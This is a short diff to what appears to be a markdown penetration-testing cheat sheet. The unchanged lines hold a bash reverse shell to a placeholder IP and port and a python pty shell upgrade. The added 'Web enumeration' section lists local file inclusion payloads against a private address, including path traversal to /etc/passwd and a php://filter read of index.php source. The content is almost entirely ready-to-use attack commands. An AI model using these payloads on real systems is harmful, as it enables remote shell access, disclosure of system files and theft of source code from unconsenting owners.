@@ -69,3 +69,8 @@
 - `/bin/bash -c 'bash -i > /dev/tcp/IP/PORT 0>&1'`
 
 - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+
+###### Web enumeration
+- `http://10.0.0.1/?page=index.php`
+- `http://10.0.0.1/?page=../../../etc/passwd`
+- `http://10.0.0.1/?page=php://filter/convert.base64-encode/resource=index.php`
